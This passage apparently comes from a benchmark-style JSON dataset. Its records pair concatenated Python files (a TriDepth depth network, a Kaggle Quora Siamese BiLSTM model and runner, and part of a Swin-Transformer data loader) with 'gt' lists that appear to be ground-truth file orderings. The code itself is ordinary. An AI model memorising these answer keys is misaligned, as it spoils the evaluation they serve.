verts_3d_cam[b_idx].detach().cpu().numpy()\n        np_verts_2d = self.base_mesh.mesh_list[b_idx].verts_2d\n\n\n        write_obj_with_texture(filename,\n                               np_verts_3d_cam, faces,\n                               textures.cpu().numpy(),\n                               np_verts_2d)\n\n'tridepth/tridepth/__init__.py'\n:from .mesh_2d import BaseMesh, BatchBaseMesh, BatchTensor\nfrom . import renderer\nfrom . import extractor\nfrom .tridepth_3d import TriDepth\n\n'tridepth/models/networks/drn.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport collections\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport torch.utils.model_zoo as model_zoo\n\n\ndef conv(in_planes, out_planes):\n    return nn.Sequential(\n        nn.Conv2d(in_planes, out_planes, kernel_size=3, padding=1),\n        nn.BatchNorm2d(out_planes),\n        nn.ReLU(inplace=True)\n    )\n\n\nclass BasicBlock(nn.Module):\n    expansion = 1\n\n    def __init__(self, inplanes, planes, stride=1, downsample=None,\n                 dilation=(1, 1), residual=True):\n        super(BasicBlock, self).__init__()\n        self.conv1 = nn.Conv2d(inplanes, planes, kernel_size=3, stride=stride,\n                               padding=dilation[0], bias=False, dilation=dilation[0])\n        self.bn1 = nn.BatchNorm2d(planes)\n        self.relu = nn.ReLU(inplace=True)\n        self.conv2 = nn.Conv2d(planes, planes, kernel_size=3, stride=1,\n                               padding=dilation[1], bias=False, dilation=dilation[1])\n        self.bn2 = nn.BatchNorm2d(planes)\n        self.downsample = downsample\n        self.stride = stride\n        self.residual = residual\n\n    def forward(self, x):\n        residual = x\n\n        out = self.conv1(x)\n        out = self.bn1(out)\n        out = self.relu(out)\n\n        out = self.conv2(out)\n        out = self.bn2(out)\n\n        if self.downsample is not None:\n            residual = self.downsample(x)\n        if self.residual:\n            out += residual\n        out = self.relu(out)\n\n        return out\n\n\nclass Bottleneck(nn.Module):\n    expansion = 4\n\n    def __init__(self, inplanes, planes, stride=1, downsample=None,\n                 dilation=(1, 1), residual=True):\n        super(Bottleneck, self).__init__()\n        self.conv1 = nn.Conv2d(inplanes, planes, kernel_size=1, bias=False)\n        self.bn1 = nn.BatchNorm2d(planes)\n        self.conv2 = nn.Conv2d(planes, planes, kernel_size=3, stride=stride,\n                               padding=dilation[1], bias=False,\n                               dilation=dilation[1])\n        self.bn2 = nn.BatchNorm2d(planes)\n        self.conv3 = nn.Conv2d(planes, planes * 4, kernel_size=1, bias=False)\n        self.bn3 = nn.BatchNorm2d(planes * 4)\n        self.relu = nn.ReLU(inplace=True)\n        self.downsample = downsample\n        self.stride = stride\n\n    def forward(self, x):\n        residual = x\n\n        out = self.conv1(x)\n        out = self.bn1(out)\n        out = self.relu(out)\n\n        out = self.conv2(out)\n        out = self.bn2(out)\n        out = self.relu(out)\n\n        out = self.conv3(out)\n        out = self.bn3(out)\n\n        if self.downsample is not None:\n            residual = self.downsample(x)\n\n        out += residual\n        out = self.relu(out)\n\n        return out\n\n\nclass Unpool(nn.Module):\n\n    def __init__(self, num_channels, stride=2):\n        super(Unpool, self).__init__()\n\n        self.num_channels = num_channels\n        self.stride = stride\n\n\n\n        self.weights = torch.autograd.Variable(\n            torch.zeros(num_channels, 1, stride, stride).cuda()\n        )\n        self.weights[:, :, 0, 0] = 1\n\n    def forward(self, x):\n        return F.conv_transpose2d(x, self.weights, stride=self.stride, groups=self.num_channels)\n\n\nclass UpProjModule(nn.Module):\n\n\n\n\n    def __init__(self, in_channels, out_channels, up_flag=True):\n        super(UpProjModule, self).__init__()\n        self.up_flag = up_flag\n        self.unpool = Unpool(in_channels)\n        self.upper_branch = nn.Sequential(collections.OrderedDict([\n            ('conv1', nn.Conv2d(in_channels, out_channels,\n                                kernel_size=5, stride=1, padding=2, bias=False)),\n            ('batchnorm1', nn.BatchNorm2d(out_channels)),\n            ('relu', nn.ReLU()),\n            ('conv2', nn.Conv2d(out_channels, out_channels,\n                                kernel_size=3, stride=1, padding=1, bias=False)),\n            ('batchnorm2', nn.BatchNorm2d(out_channels)),\n        ]))\n        self.bottom_branch = nn.Sequential(collections.OrderedDict([\n            ('conv', nn.Conv2d(in_channels, out_channels,\n                               kernel_size=5, stride=1, padding=2, bias=False)),\n            ('batchnorm', nn.BatchNorm2d(out_channels)),\n        ]))\n        self.relu = nn.ReLU()\n\n    def forward(self, x):\n        if self.up_flag:\n            x = self.unpool(x)\n        x1 = self.upper_branch(x)\n        x2 = self.bottom_branch(x)\n        x = x1 + x2\n        x = self.relu(x)\n        return x\n\n\nclass DRN_d_54(nn.Module):\n\n\n    def __init__(self, block=Bottleneck,\n                 layers=[1, 1, 3, 4, 6, 3, 1, 1],\n                 channels=(16, 32, 64, 128, 256, 512, 512, 512),\n                 model_type=\"upconv\",\n                 feat_size=512,\n                 pretrained=True):\n        super(DRN_d_54, self).__init__()\n        self.inplanes = channels[0]\n        self.out_dim = channels[-1]\n        self.model_type = model_type\n\n\n        self.layer0 = nn.Sequential(\n            nn.Conv2d(3, channels[0], kernel_size=7, stride=1,\n                      padding=3, bias=False),\n            nn.BatchNorm2d(channels[0]),\n            nn.ReLU(inplace=True)\n        )\n\n        self.layer1 = self._make_conv_layers(channels[0], layers[0], stride=1)\n        self.layer2 = self._make_conv_layers(channels[1], layers[1], stride=2)\n\n        self.layer3 = self._make_layer(block, channels[2], layers[2], stride=2)\n        self.layer4 = self._make_layer(block, channels[3], layers[3], stride=2)\n        self.layer5 = self._make_layer(block, channels[4], layers[4],\n                                       dilation=2, new_level=False)\n        self.layer6 = self._make_layer(block, channels[5], layers[5],\n                                       dilation=4, new_level=False)\n        self.layer7 = self._make_conv_layers(channels[6], layers[6],\n                                             dilation=2)\n        self.layer8 = self._make_conv_layers(channels[7], layers[7],\n                                             dilation=1)\n\n\n        if self.model_type == \"simple\":\n            self.conv1 = conv(16, feat_size // 4)\n            self.conv2 = conv(32, feat_size // 4)\n            self.conv3 = conv(256, feat_size // 4)\n            self.conv4 = conv(512, feat_size // 4)\n\n        elif self.model_type == \"upconv\":\n            self.upproj4 = UpProjModule(512, 512, up_flag=True)\n            self.upproj3 = UpProjModule(512 + 256, 256, up_flag=True)\n            self.upproj2 = UpProjModule(256 + 32, 32, up_flag=True)\n            self.upproj1 = UpProjModule(32 + 16, 16, up_flag=False)\n\n            self.conv4 = conv(512, feat_size // 4)\n            self.conv3 = conv(256, feat_size // 4)\n            self.conv2 = conv(32, feat_size // 4)\n            self.conv1 = conv(16, feat_size // 4)\n\n        else:\n            raise NotImplementedError\n\n        if pretrained:\n            drn_d_54_url = \"http://dl.yf.io/drn/drn_d_54-0e0534ff.pth\"\n            self.load_weights(drn_d_54_url)\n\n    def load_weights(self, weight_url):\n        pretrained_dict = model_zoo.load_url(weight_url)\n        model_dict = self.state_dict()\n\n\n        pretrained_dict = {\n            k: v for k, v in pretrained_dict.items() if k in model_dict and (v.shape == model_dict[k].shape)\n        }\n\n        model_dict.update(pretrained_dict)\n\n        self.load_state_dict(model_dict)\n\n    def _make_layer(self, block, planes, blocks, stride=1, dilation=1,\n                    new_level=True, residual=True):\n        assert dilation == 1 or dilation % 2 == 0\n        downsample = None\n        if stride != 1 or self.inplanes != planes * block.expansion:\n            downsample = nn.Sequential(\n                nn.Conv2d(self.inplanes, planes * block.expansion,\n                          kernel_size=1, stride=stride, bias=False),\n                nn.BatchNorm2d(planes * block.expansion),\n            )\n\n        layers = list()\n        layers.append(block(\n            self.inplanes, planes, stride, downsample,\n            dilation=(1, 1) if dilation == 1 else (\n                dilation // 2 if new_level else dilation, dilation),\n            residual=residual))\n        self.inplanes = planes * block.expansion\n        for i in range(1, blocks):\n            layers.append(block(self.inplanes, planes, residual=residual,\n                                dilation=(dilation, dilation)))\n\n        return nn.Sequential(*layers)\n\n    def _make_conv_layers(self, channels, convs, stride=1, dilation=1):\n        modules = []\n        for i in range(convs):\n            modules.extend([\n                nn.Conv2d(self.inplanes, channels, kernel_size=3,\n                          stride=stride if i == 0 else 1,\n                          padding=dilation, bias=False, dilation=dilation),\n                nn.BatchNorm2d(channels),\n                nn.ReLU(inplace=True)])\n            self.inplanes = channels\n        return nn.Sequential(*modules)\n\n    def forward(self, x):\n        y = list()\n\n        x = self.layer0(x)\n\n\n        x1 = self.layer1(x)\n\n\n        x2 = self.layer2(x1)\n\n\n        x3 = self.layer3(x2)\n\n\n        x3_tmp = self.layer4(x3)\n        x3_tmp = self.layer5(x3_tmp)\n        x3_tmp = self.layer6(x3_tmp)\n        x3_tmp = self.layer7(x3_tmp)\n        x4 = self.layer8(x3_tmp)\n\n\n        if self.model_type == \"simple\":\n\n            x1 = F.interpolate(x1, size=x.size()[-2:])\n            x2 = F.interpolate(x2, size=x.size()[-2:])\n            x3 = F.interpolate(x3, size=x.size()[-2:])\n            x4 = F.interpolate(x4, size=x.size()[-2:])\n\n            x1 = self.conv1(x1)\n            x2 = self.conv2(x2)\n            x3 = self.conv3(x3)\n            x4 = self.conv4(x4)\n\n            out = torch.cat((x1, x2, x3, x4), 1)\n            return out\n\n        elif self.model_type == \"upconv\":\n            x4_up = self.upproj4(x4)\n            x4_up = F.interpolate(x4_up, size=x3.size()[-2:])\n\n            x3_up = self.upproj3(torch.cat((x4_up, x3), 1))\n            x3_up = F.interpolate(x3_up, size=x2.size()[-2:])\n\n            x2_up = self.upproj2(torch.cat((x3_up, x2), 1))\n            x2_up = F.interpolate(x2_up, size=x1.size()[-2:])\n\n            x1_up = self.upproj1(torch.cat((x2_up, x1), 1))\n\n\n            x1_up = self.conv1(F.interpolate(x1_up, size=x.size()[-2:]))\n            x2_up = self.conv2(F.interpolate(x2_up, size=x.size()[-2:]))\n            x3_up = self.conv3(F.interpolate(x3_up, size=x.size()[-2:]))\n            x4_up = self.conv4(F.interpolate(x4_up, size=x.size()[-2:]))\n\n            out = torch.cat((x1_up, x2_up, x3_up, x4_up), 1)\n            return out\n\n        else:\n            raise NotImplementedError\n\n'tridepth/models/networks/__init__.py'\n:from .drn import DRN_d_54\nfrom .feature_sampling import feature_sampling\nfrom .face_pooling import FacePooling\nfrom .face_cnn import FaceDepthPredictor\n",
        "gt": [
            "'tridepth/models/networks/drn.py'",
            "'tridepth/models/networks/__init__.py'",
            "'tridepth/tridepth/tridepth_3d.py'",
            "'tridepth/tridepth/__init__.py'"
        ]
    },
    {
        "files": [
            "'kaggle-quora-solution-8th/model_hhy/deep_model/model/util/rnn.py'",
            "'kaggle-quora-solution-8th/model_hhy/deep_model/model/siamese_bilstm.py'",
            "'kaggle-quora-solution-8th/model_hhy/deep_model/run_siamse.py'"
        ],
        "content": "'kaggle-quora-solution-8th/model_hhy/deep_model/model/util/rnn.py'\n:import tensorflow as tf\n\n\ndef last_relevant_output(output, sequence_length):\n\n    with tf.name_scope(\"last_relevant_output\"):\n        batch_size = tf.shape(output)[0]\n        max_length = tf.shape(output)[-2]\n        out_size = int(output.get_shape()[-1])\n        index = tf.range(0, batch_size) * max_length + (sequence_length - 1)\n        flat = tf.reshape(output, [-1, out_size])\n        relevant = tf.gather(flat, index)\n        return relevant\n\n'kaggle-quora-solution-8th/model_hhy/deep_model/model/siamese_bilstm.py'\n:from copy import deepcopy\nimport logging\nfrom overrides import overrides\nimport tensorflow as tf\nfrom tensorflow.contrib.rnn import LSTMCell\nfrom tqdm import tqdm\nimport numpy as np\nimport math\n\nfrom util.switchable_dropout_wrapper import SwitchableDropoutWrapper\nfrom util.pooling import mean_pool\nfrom util.rnn import last_relevant_output\nfrom basetfmodel import BaseTfModel\n\nlogger = logging.getLogger(__name__)\n\nclass SiameseBiLSTM(BaseTfModel):\n    def __init__(self, config_dict):\n        super(SiameseBiLSTM, self).__init__(config_dict)\n\n\n    def _build_forward(self):\n\n\n\n\n        sentence_one_mask = tf.sign(self.sentence_one,\n                                    name=\"sentence_one_masking\")\n        sentence_two_mask = tf.sign(self.sentence_two,\n                                    name=\"sentence_two_masking\")\n\n\n\n        sentence_one_len = tf.reduce_sum(sentence_one_mask, 1)\n        sentence_two_len = tf.reduce_sum(sentence_two_mask, 1)\n\n        word_vocab_size = self.word_vocab_size\n        word_embedding_dim = self.word_embedding_dim\n        word_embedding_matrix = self.word_embedding_matrix\n        fine_tune_embeddings = self.fine_tune_embeddings\n\n        with tf.variable_scope(\"embeddings\"):\n            with tf.variable_scope(\"embedding_var\"), tf.device(\"/cpu:0\"):\n                if self.mode == \"train\":\n\n\n                    word_emb_mat = tf.get_variable(\n                        \"word_emb_mat\",\n                        dtype=\"float\",\n                        shape=[word_vocab_size,\n                               word_embedding_dim],\n                        initializer=tf.constant_initializer(\n                            word_embedding_matrix),\n                        trainable=fine_tune_embeddings)\n                else:\n\n\n                    word_emb_mat = tf.get_variable(\"word_emb_mat\",\n                                                   shape=[word_vocab_size,\n                                                          word_embedding_dim],\n                                                   dtype=\"float\",\n                                                   trainable=fine_tune_embeddings)\n\n            with tf.variable_scope(\"word_embeddings\"):\n\n                word_embedded_sentence_one = tf.nn.embedding_lookup(\n                    word_emb_mat,\n                    self.sentence_one)\n\n                word_embedded_sentence_two = tf.nn.embedding_lookup(\n                    word_emb_mat,\n                    self.sentence_two)\n\n        rnn_hidden_size = self.rnn_hidden_size\n        rnn_output_mode = self.rnn_output_mode\n        output_keep_prob = self.output_keep_prob\n        rnn_cell_fw_one = LSTMCell(rnn_hidden_size, state_is_tuple=True)\n        d_rnn_cell_fw_one = SwitchableDropoutWrapper(rnn_cell_fw_one,\n                                                     self.is_train,\n                                                     output_keep_prob=output_keep_prob)\n        rnn_cell_bw_one = LSTMCell(rnn_hidden_size, state_is_tuple=True)\n        d_rnn_cell_bw_one = SwitchableDropoutWrapper(rnn_cell_bw_one,\n                                                     self.is_train,\n                                                     output_keep_prob=output_keep_prob)\n        with tf.variable_scope(\"encode_sentences\"):\n\n            (fw_output_one, bw_output_one), _ = tf.nn.bidirectional_dynamic_rnn(\n                cell_fw=d_rnn_cell_fw_one,\n                cell_bw=d_rnn_cell_bw_one,\n                dtype=\"float\",\n                sequence_length=sentence_one_len,\n                inputs=word_embedded_sentence_one,\n                scope=\"encoded_sentence_one\")\n            if self.share_encoder_weights:\n\n                tf.get_variable_scope().reuse_variables()\n                (fw_output_two, bw_output_two), _ = tf.nn.bidirectional_dynamic_rnn(\n                    cell_fw=d_rnn_cell_fw_one,\n                    cell_bw=d_rnn_cell_bw_one,\n                    dtype=\"float\",\n                    sequence_length=sentence_two_len,\n                    inputs=word_embedded_sentence_two,\n                    scope=\"encoded_sentence_one\")\n            else:\n\n                rnn_cell_fw_two = LSTMCell(rnn_hidden_size, state_is_tuple=True)\n                d_rnn_cell_fw_two = SwitchableDropoutWrapper(\n                    rnn_cell_fw_two,\n                    self.is_train,\n                    output_keep_prob=output_keep_prob)\n                rnn_cell_bw_two = LSTMCell(rnn_hidden_size, state_is_tuple=True)\n                d_rnn_cell_bw_two = SwitchableDropoutWrapper(\n                    rnn_cell_bw_two,\n                    self.is_train,\n                    output_keep_prob=output_keep_prob)\n                (fw_output_two, bw_output_two), _ = tf.nn.bidirectional_dynamic_rnn(\n                    cell_fw=d_rnn_cell_fw_two,\n                    cell_bw=d_rnn_cell_bw_two,\n                    dtype=\"float\",\n                    sequence_length=sentence_two_len,\n                    inputs=word_embedded_sentence_two,\n                    scope=\"encoded_sentence_two\")\n\n\n\n            if rnn_output_mode == \"mean_pool\":\n\n                pooled_fw_output_one = mean_pool(fw_output_one,\n                                                 sentence_one_len)\n                pooled_bw_output_one = mean_pool(bw_output_one,\n                                                 sentence_one_len)\n                pooled_fw_output_two = mean_pool(fw_output_two,\n                                                 sentence_two_len)\n                pooled_bw_output_two = mean_pool(bw_output_two,\n                                                 sentence_two_len)\n\n                encoded_sentence_one = tf.concat([pooled_fw_output_one,\n                                                  pooled_bw_output_one], 1)\n                encoded_sentence_two = tf.concat([pooled_fw_output_two,\n                                                  pooled_bw_output_two], 1)\n            elif rnn_output_mode == \"last\":\n\n                last_fw_output_one = last_relevant_output(fw_output_one,\n                                                          sentence_one_len)\n                last_bw_output_one = last_relevant_output(bw_output_one,\n                                                          sentence_one_len)\n                last_fw_output_two = last_relevant_output(fw_output_two,\n                                                          sentence_two_len)\n                last_bw_output_two = last_relevant_output(bw_output_two,\n                                                          sentence_two_len)\n\n                encoded_sentence_one = tf.concat([last_fw_output_one,\n                                                  last_bw_output_one], 1)\n                encoded_sentence_two = tf.concat([last_fw_output_two,\n                                                  last_bw_output_two], 1)\n            else:\n                raise ValueError(\"Got an unexpected value {} for \"\n                                 \"rnn_output_mode, expected one of \"\n                                 \"[mean_pool, last]\")\n\n        with tf.name_scope(\"loss\"):\n\n\n\n\n            self.y_pred = self._l1_similarity(encoded_sentence_one,\n                                              encoded_sentence_two)\n\n\n\n            self.loss = tf.reduce_mean(\n                -tf.reduce_sum(tf.cast(self.y_true, \"float\") *\n                               tf.log(self.y_pred),\n                               axis=1))\n\n        with tf.name_scope(\"accuracy\"):\n\n\n            correct_predictions = tf.equal(\n                tf.argmax(self.y_pred, 1),\n                tf.argmax(self.y_true, 1))\n\n\n            self.accuracy = tf.reduce_mean(tf.cast(correct_predictions,\n                                                   \"float\"))\n\n        with tf.name_scope(\"train\"):\n            optimizer = tf.train.AdamOptimizer()\n            self.training_op = optimizer.minimize(self.loss,\n                                                  global_step=self.global_step)\n\n        with tf.name_scope(\"train_summaries\"):\n\n            tf.summary.scalar(\"loss\", self.loss)\n            tf.summary.scalar(\"accuracy\", self.accuracy)\n            self.summary_op = tf.summary.merge_all()\n\n\n'kaggle-quora-solution-8th/model_hhy/deep_model/run_siamse.py'\n:import argparse\nimport sys\nimport logging\nimport math\nimport numpy as np\nimport os\nimport pandas as pd\nimport pickle\nimport json\nfrom util.data_manager import DataManager\nfrom siamese_bilstm import SiameseBiLSTM\nfrom siamese_matching_bilstm import SiameseMatchingBiLSTM\n\n\nseed = 1024\nnp.random.seed(seed)\n\npath = '../data/'\n\n\nlogger = logging.getLogger(__name__)\n\ndef main():\n\n    argparser = argparse.ArgumentParser(\n        description=(\"Run a baseline Siamese BiLSTM model \"\n                     \"for paraphrase identification.\"))\n    argparser.add_argument(\"--mode\", type=str,\n                           default='train',\n                           help=(\"One of {train|predict}, to \"\n                                 \"indicate what you want the model to do. \"\n                                 \"If you pick \\\"predict\\\", then you must also \"\n                                 \"supply the path to a pretrained model and \"\n                                 \"DataIndexer to load.\"))\n\n    argparser.add_argument(\"--model_use\", type=str,\n                           default='siamse',\n                           help=(\"use the model for trian.{siamse|siamse_match|bimpm}\"))\n\n    argparser.add_argument(\"--model_load_dir\", type=str,default='./data/models/siamse_match/0/',\n                           help=(\"The path to a directory with checkpoints to \"\n                                 \"load for evaluation or prediction. The \"\n                                 \"latest checkpoint will be loaded.\"))\n    argparser.add_argument(\"--dataindexer_load_path\", type=str,\n                           help=(\"The path to the dataindexer fit on the \"\n                                 \"train data, so we can properly index the \"\n                                 \"test data for evaluation or prediction.\"))\n    argparser.add_argument(\"--train_file\", type=str,\n                           default=os.path.join(path,\n                                            \"train_final_clean.pkl\"),\n                           help=\"Path to a file to train on.\")\n    argparser.add_argument(\"--test_file\", type=str,\n                           default=os.path.join(path,\n                                                \"test_final_clean.pkl\"))\n    argparser.add_argument(\"--batch_size\", type=int, default=128,\n                           help=\"Number of instances per batch.\")\n    argparser.add_argument(\"--num_epochs\", type=int, default=2,\n                           help=(\"Number of epochs to perform in \"\n                                 \"training.\"))\n    argparser.add_argument(\"--early_stopping_patience\", type=int, default=0,\n                           help=(\"number of epochs with no validation \"\n                                 \"accuracy improvement after which training \"\n                                 \"will be stopped\"))\n    argparser.add_argument(\"--num_sentence_words\", type=int, default=30,\n                           help=(\"The maximum length of a sentence. Longer \"\n                                 \"sentences will be truncated, and shorter \"\n                                 \"ones will be padded.\"))\n    argparser.add_argument(\"--word_embedding_dim\", type=int, default=100,\n                           help=\"Dimensionality of the word embedding layer\")\n    argparser.add_argument(\"--pretrained_embeddings_file_path\", type=str,\n                           help=\"Path to a file with pretrained embeddings.\",\n                           default=os.path.join(path,\n                                                \"glove.6B.100d.txt\"))\n    argparser.add_argument(\"--fine_tune_embeddings\", action=\"store_true\",\n                           help=(\"Whether to train the embedding layer \"\n                                 \"(if True), or keep it fixed (False).\"))\n    argparser.add_argument(\"--rnn_hidden_size\", type=int, default=256,\n                           help=(\"The output dimension of the RNN.\"))\n    argparser.add_argument(\"--share_encoder_weights\", action=\"store_true\",\n                           help=(\"Whether to use the same encoder on both \"\n                                 \"input sentences (thus sharing weights), \"\n                                 \"or a different one for each sentence\"))\n    argparser.add_argument(\"--rnn_output_mode\", type=str, default=\"last\",\n                           choices=[\"mean_pool\", \"last\"],\n                           help=(\"How to calculate the final sentence \"\n                                 \"representation from the RNN outputs. \"\n                                 \"\\\"mean_pool\\\" indicates that the outputs \"\n                                 \"will be averaged (with respect to padding), \"\n                                 \"and \\\"last\\\" indicates that the last \"\n                                 \"relevant output will be used as the \"\n                                 \"sentence representation.\"))\n    argparser.add_argument(\"--output_keep_prob\", type=float, default=1.0,\n                           help=(\"The proportion of RNN outputs to keep, \"\n                                 \"where the rest are dropped out.\"))\n    argparser.add_argument(\"--log_period\", type=int, default=10,\n                           help=(\"Number of steps between each summary \"\n                                 \"op evaluation.\"))\n    argparser.add_argument(\"--val_period\", type=int, default=250,\n                           help=(\"Number of steps between each evaluation of \"\n                                 \"validation performance.\"))\n    argparser.add_argument(\"--log_dir\", type=str,\n                           default=os.path.join(\n                                                \"./data/logs/\"),\n                           help=(\"Directory to save logs to.\"))\n    argparser.add_argument(\"--save_period\", type=int, default=250,\n                           help=(\"Number of steps between each \"\n                                 \"model checkpoint\"))\n    argparser.add_argument(\"--save_dir\", type=str,\n                           default=os.path.join(\n                                                \"./data/models/\"),\n                           help=(\"Directory to save model checkpoints to.\"))\n    argparser.add_argument(\"--run_id\", type=str,default=0,\n                           help=(\"Identifying run ID for this run. If \"\n                                 \"predicting, you probably want this \"\n                                 \"to be the same as the train run_id\"))\n    argparser.add_argument(\"--model_name\", type=str,default='siamse',\n                           help=(\"Identifying model name for this run. If\"\n                                 \"predicting, you probably want this \"\n                                 \"to be the same as the train run_id\"))\n    argparser.add_argument(\"--reweight_predictions_for_kaggle\", action=\"store_true\",\n                           help=(\"Only relevant when predicting. Whether to \"\n                                 \"reweight the prediction probabilities to \"\n                                 \"account for class proportion discrepancy \"\n                                 \"between train and test.\"))\n\n    argparser.add_argument(\"--is_load\",default=False,\n                           help=(\"load has trained model\"))\n\n    config = argparser.parse_args()\n\n    model_name = config.model_name\n    run_id = config.run_id\n    mode = config.mode\n\n\n    data_manager = DataManager()\n    data_manager.set_vocab_mode('word')\n    batch_size = config.batch_size\n    num_sentence_words = config.num_sentence_words\n\n    word_dict_base = './data/dictionary/'\n    word_dict_path = {'word_index':word_dict_base+'word_index.pkl','index_word':word_dict_base+'index_word.pkl',\n                      'char_index':word_dict_base+'char_index.pkl','index_char':word_dict_base+'index_char.pkl'}\n    data_manager.load_word_dictionary(word_dict=word_dict_path)\n\n    if mode == \"train\":\n\n\n        train_samples,val_samples = data_manager.get_train_data_from_file(config.train_file,\n                                                        max_lengths=num_sentence_words)\n        train_data_size = len(train_samples)\n        val_data_size = len(val_samples)\n\n    else:\n        test_samples = data_manager.get_test_data_from_file(config.test_file,max_lengths=num_sentence_words)\n        test_data_size = len(test_samples)\n\n\n    vars(config)[\"word_vocab_size\"] = data_manager.get_vocab_size()\n\n\n    log_dir = config.log_dir\n    log_path = os.path.join(log_dir, model_name)\n    logger.info(\"Writing logs to {}\".format(log_path))\n    if not os.path.exists(log_path):\n        logger.info(\"log path {} does not exist, \"\n                    \"creating it\".format(log_path))\n        os.makedirs(log_path)\n    params_path = os.path.join(log_path, mode + \"params.json\")\n    logger.info(\"Writing params to {}\".format(params_path))\n    with open(params_path, 'w') as params_file:\n        json.dump(vars(config), params_file, indent=4)\n\n\n\n    embedding_matrix = data_manager.get_embedd_matrix(True)\n    vars(config)[\"word_embedding_matrix\"] = embedding_matrix\n\n\n\n\n    if config.model_use=='siamse':\n        model = SiameseBiLSTM(vars(config))\n        model._create_placeholders()\n        model._build_forward()\n\n    elif config.model_use=='siamse_match':\n        model = SiameseMatchingBiLSTM(vars(config))\n        model._create_placeholders()\n        model._build_forward()\n\n    if mode == \"train\":\n\n        num_epochs = config.num_epochs\n        num_train_steps_per_epoch = int(math.ceil(train_data_size / batch_size))\n        num_val_steps = int(math.ceil(val_data_size / batch_size))\n        log_period = config.log_period\n        val_period = config.val_period\n\n\n        save_period = config.save_period\n        save_dir = os.path.join(config.save_dir, model_name + \"/\"+str(run_id))\n        save_path = os.path.join(save_dir, model_name + \"-\"+str(run_id))\n\n        logger.info(\"Checkpoints will be written to {}\".format(save_dir))\n        if not os.path.exists(save_dir):\n            logger.info(\"save path {} does not exist, \"\n                        \"creating it\".format(save_dir))\n            os.makedirs(save_dir)\n\n        logger.info(\"Saving fitted DataManager to {}\".format(save_dir))\n        data_manager_pickle_name = \"{}-{}-DataManager.pkl\".format(model_name,\n                                                                  run_id)\n        pickle.dump(data_manager,\n                    open(os.path.join(save_dir, data_manager_pickle_name), \"wb\"))\n\n        patience = config.early_stopping_patience\n\n        if config.is_load:\n            model_load_dir = config.model_load_dir\n        else:\n            model_load_dir=''\n\n        model.train(data_manager,\n                    train_samples,\n                    val_samples,\n                    batch_size=batch_size,\n                    num_train_steps_per_epoch=num_train_steps_per_epoch,\n                    num_epochs=num_epochs,\n                    num_val_steps=num_val_steps,\n                    save_path=save_path,\n                    log_path=log_path,\n                    log_period=log_period,\n                    val_period=val_period,\n                    save_period=save_period,\n                    patience=patience,model_load_dir=model_load_dir,is_load=config.is_load)\n\n    else:\n\n        model_load_dir = config.model_load_dir\n        num_test_steps = int(math.ceil(test_data_size / batch_size))\n\n        raw_predictions = model.predict(data_manager,test_samples,\n                                        model_load_dir=model_load_dir,\n                                        batch_size=batch_size,\n                                        num_test_steps=num_test_steps)\n\n\n        is_duplicate_probabilities = np.delete(raw_predictions, 0, 1)\n\n\n        output_predictions_path = os.path.join(log_path, model_name + \"-\" +\n                                               str(run_id)+\n                                               \"-output_predictions.csv\")\n        logger.info(\"Writing predictions to {}\".format(output_predictions_path))\n        is_duplicate_df = pd.DataFrame(is_duplicate_probabilities)\n        is_duplicate_df.to_csv(output_predictions_path, index_label=\"test_id\",\n                               header=[\"is_duplicate\"])\n\n\n\nif __name__ == '__main__':\n    main()\n",
        "gt": [
            "'kaggle-quora-solution-8th/model_hhy/deep_model/model/util/rnn.py'",
            "'kaggle-quora-solution-8th/model_hhy/deep_model/model/siamese_bilstm.py'",
            "'kaggle-quora-solution-8th/model_hhy/deep_model/run_siamse.py'"
        ]
    },
    {
        "files": [
            "'ACmix/Swin-Transformer/data/cached_image_folder.py'",
            "'ACmix/Swin-Transformer/data/__init__.py'",
            "'ACmix/Swin-Transformer/data/build.py'",
            "'ACmix/Swin-Transformer/main.py'"
        ],
        "content": "'ACmix/Swin-Transformer/data/cached_image_folder.py'\n:\n\n\n\n\n\n\nimport io\nimport os\nimport time\nimport torch.distributed as dist\nimport torch.utils.data as data\nfrom PIL import Image\n\nfrom .zipreader import is_zip_path, ZipReader\n\n\ndef has_file_allowed_extension(filename, extensions):\n\n    filename_lower = filename.lower()\n    return any(filename_lower.endswith(ext) for ext in extensions)\n\n\ndef find_classes(dir):\n    classes = [d for d in os.listdir(dir) if os.path.isdir(os.path.join(dir, d))]\n    classes.sort()\n    class_to_idx = {classes[i]: i for i in range(len(classes))}\n    return classes, class_to_idx\n\n\ndef make_dataset(dir, class_to_idx, extensions):\n    images = []\n    dir = os.path.expanduser(dir)\n    for target in sorted(os.listdir(dir)):\n        d = os.path.join(dir, target)\n        if not os.path.isdir(d):\n            continue\n\n        for root, _, fnames in sorted(os.walk(d)):\n            for fname in sorted(fnames):\n                if has_file_allowed_extension(fname, extensions):\n                    path = os.path.join(root, fname)\n                    item = (path, class_to_idx[target])\n                    images.append(item)\n\n    return images\n\n\ndef make_dataset_with_ann(ann_file, img_prefix, extensions):\n    images = []\n    with open(ann_file, \"r\") as f:\n        contents = f.readlines()\n        for line_str in contents:\n            path_contents = [c for c in line_str.split('\\t')]\n            im_file_name = path_contents[0]\n            class_index = int(path_contents[1])\n\n            assert str.lower(os.path.splitext(im_file_name)[-1]) in extensions\n            item = (os.path.join(img_prefix, im_file_name), class_index)\n\n            images.append(item)\n\n    return images\n\n\nclass DatasetFolder(data.Dataset):\n\n\n    def __init__(self, root, loader, extensions, ann_file='', img_prefix='', transform=None, target_transform=None,\n                 cache_mode=\"no\"):\n\n        if ann_file == '':\n            _, class_to_idx = find_classes(root)\n            samples = make_dataset(root, class_to_idx, extensions)\n\n        else:\n            samples = make_dataset_with_ann(os.path.join(root, ann_file),\n                                            os.path.join(root, img_prefix),\n                                            extensions)\n\n        if len(samples) == 0:\n            raise (RuntimeError(\"Found 0 files in subfolders of: \" + root + \"\\n\" +\n                                \"Supported extensions are: \" + \",\".join(extensions)))\n\n        self.root = root\n        self.loader = loader\n        self.extensions = extensions\n\n        self.samples = samples\n        self.labels = [y_1k for _, y_1k in samples]\n        self.classes = list(set(self.labels))\n\n        self.transform = transform\n        self.target_transform = target_transform\n\n        self.cache_mode = cache_mode\n        if self.cache_mode != \"no\":\n            self.init_cache()\n\n    def init_cache(self):\n        assert self.cache_mode in [\"part\", \"full\"]\n        n_sample = len(self.samples)\n        global_rank = dist.get_rank()\n        world_size = dist.get_world_size()\n\n        samples_bytes = [None for _ in range(n_sample)]\n        start_time = time.time()\n        for index in range(n_sample):\n            if index % (n_sample // 10) == 0:\n                t = time.time() - start_time\n                print(f'global_rank {dist.get_rank()} 